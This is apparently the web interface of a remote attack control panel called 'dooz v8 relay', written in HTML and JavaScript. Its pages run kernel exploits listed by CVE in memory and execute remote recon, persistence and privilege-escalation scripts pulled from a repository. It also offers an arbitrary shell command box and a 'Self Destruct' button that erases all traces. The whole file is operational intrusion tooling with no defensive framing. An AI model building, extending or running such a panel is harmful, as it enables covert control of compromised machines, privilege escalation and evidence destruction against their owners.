<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>dooz</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#0d1117;color:#c9d1d9;font-size:14px}.c{max-width:900px;margin:0 auto;padding:20px}header{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #21262d;margin-bottom:25px}.logo{font-size:20px;font-weight:600;color:#58a6ff}.logo span{font-size:11px;color:#6e7681}nav a{color:#6e7681;text-decoration:none;margin-left:20px;cursor:pointer}nav a:hover,nav a.active{color:#58a6ff}.card{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:16px;margin-bottom:16px}.card h3{color:#6e7681;font-size:11px;text-transform:uppercase;margin-bottom:12px}.stat{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #21262d}.stat:last-child{border:none}.exp{display:flex;align-items:center;padding:10px;margin:6px 0;background:#21262d;border-radius:4px;cursor:pointer}.exp:hover{background:#30363d}.exp .cve{font-weight:600;width:160px;color:#58a6ff}.exp .nm{flex:1;color:#8b949e}.bar{width:80px;height:6px;background:#0d1117;border-radius:3px;margin-left:10px}.bar i{display:block;height:100%;border-radius:3px}.btn{background:#238636;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-weight:600}.btn:hover{background:#2ea043}.btn-r{background:#da3633}.term{background:#000;border-radius:6px;padding:16px;font-family:monospace;font-size:13px;min-height:200px;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}.irow{display:flex;gap:10px;margin-top:12px}.irow input{flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:6px;font-family:monospace}.page{display:none}.page.active{display:block}.key{background:#0d1117;padding:12px;border-radius:6px;font-family:monospace;font-size:11px;word-break:break-all;color:#58a6ff;cursor:pointer;margin:10px 0}.ld{display:inline-block;width:14px;height:14px;border:2px solid #333;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class=c>
<header><div class=logo>dooz <span>v8 relay</span></div><nav><a class=active data-p=main>main</a><a data-p=exploit>exploits</a><a data-p=scripts>scripts</a><a data-p=term>terminal</a><a data-p=config>config</a></nav></header>
<div id=p-main class="page active">
<div class=card><h3>Target System</h3><div id=sys><span class=ld></span></div></div>
<div class=card><h3>Quick Actions</h3><button class=btn onclick="nav('exploit')">Scan Exploits</button> <button class=btn onclick="nav('scripts')">Run Scripts</button> <button class="btn btn-r" onclick=destruct()>Self Destruct</button></div>
</div>
<div id=p-exploit class=page>
<div class=card><h3>Kernel Exploits</h3><p style="color:#6e7681;font-size:12px;margin-bottom:12px">Fetched from repo, executed in-memory</p><div id=explist><span class=ld></span> Scanning...</div></div>
</div>
<div id=p-scripts class=page>
<div class=card><h3>Remote Scripts</h3><p style="color:#6e7681;font-size:12px;margin-bottom:12px">Execute from repo directly</p>
<div class=irow><input id=spath placeholder="scripts/recon.sh"><button class=btn onclick=runScript()>Run</button></div>
<div style="margin-top:12px;color:#6e7681;font-size:12px">Quick: <span style="color:#58a6ff;cursor:pointer" onclick="setS('scripts/recon.sh')">recon</span> | <span style="color:#58a6ff;cursor:pointer" onclick="setS('scripts/persist.sh')">persist</span> | <span style="color:#58a6ff;cursor:pointer" onclick="setS('scripts/privesc.sh')">privesc</span></div>
<div class=term id=sout style="margin-top:12px"></div></div>
</div>
<div id=p-term class=page>
<div class=card><h3>Shell</h3><div class=term id=tout></div><div class=irow><input id=tcmd placeholder="command" onkeydown="if(event.key==='Enter')runCmd()"><button class=btn onclick=runCmd()>Run</button></div></div>
</div>
<div id=p-config class=page>
<div class=card><h3>Deploy Key</h3><p style="color:#6e7681;font-size:12px">Add to GitHub deploy keys</p><div class=key id=dkey onclick="navigator.clipboard.writeText(this.innerText)">%s</div></div>
<div class=card><h3>URL</h3><div id=curl></div></div>
</div>
</div>
<script>
const api=async(e,d={})=>(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})).json();
const nav=p=>{document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));document.querySelectorAll('nav a').forEach(x=>x.classList.remove('active'));document.getElementById('p-'+p).classList.add('active');document.querySelector(`nav a[data-p=${p}]`).classList.add('active');if(p==='exploit')scan();if(p==='config')loadCfg();};
document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav(a.dataset.p));
const setS=s=>document.getElementById('spath').value=s;
async function init(){const s=await api('fetch',{path:'scripts/sysinfo.sh',exec:true});let h='';try{const d=JSON.parse(s.output||'{}');for(const[k,v]of Object.entries(d))h+=`<div class=stat><span style="color:#6e7681">${k}</span><span>${v}</span></div>`;}catch(e){h=s.output||'Error';}document.getElementById('sys').innerHTML=h||'<span style="color:#f85149">Failed</span>';}
async function scan(){document.getElementById('explist').innerHTML='<span class=ld></span> Scanning...';const r=await api('fetch',{path:'exploits/gate.sh',exec:true});try{const d=JSON.parse(r.output||'{}');if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'#3fb950':x.rate>=50?'#d29922':'#f85149';h+=`<div class=exp onclick="runExp('${x.cve}')"><span class=cve>${x.cve}</span><span class=nm>${x.name}</span><span>${x.rate}%</span><div class=bar><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}document.getElementById('explist').innerHTML=h;}else document.getElementById('explist').innerHTML='No exploits found';}catch(e){document.getElementById('explist').innerHTML='<span style="color:#f85149">'+r.output+'</span>';}}
async function runExp(cve){if(!confirm('Execute '+cve+'?'))return;document.getElementById('explist').innerHTML='<span class=ld></span> Running...';const r=await api('fetch',{path:'exploits/'+cve+'/run.sh',exec:true});alert(r.output||'Done');scan();}
async function runScript(){const p=document.getElementById('spath').value.trim();if(!p)return;document.getElementById('sout').innerHTML='<span class=ld></span>';const r=await api('fetch',{path:p,exec:true});document.getElementById('sout').innerHTML='<span style="color:#3fb950">'+(r.output||'(no output)')+'</span>';}
async function runCmd(){const c=document.getElementById('tcmd').value.trim();if(!c)return;document.getElementById('tcmd').value='';document.getElementById('tout').innerHTML+='<span style="color:#58a6ff">$ '+c+'</span>\n';const r=await api('exec',{cmd:c});document.getElementById('tout').innerHTML+='<span style="color:#3fb950">'+(r.output||'')+'</span>\n';document.getElementById('tout').scrollTop=1e9;}
async function loadCfg(){const r=await api('url');document.getElementById('curl').innerHTML=`<span style="color:#3fb950">${r.url||'N/A'}</span>`;}
async function destruct(){if(!confirm('DELETE ALL TRACES?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;color:#f85149;font-size:32px">DESTROYED</div>';}
init();
</script></body></html>
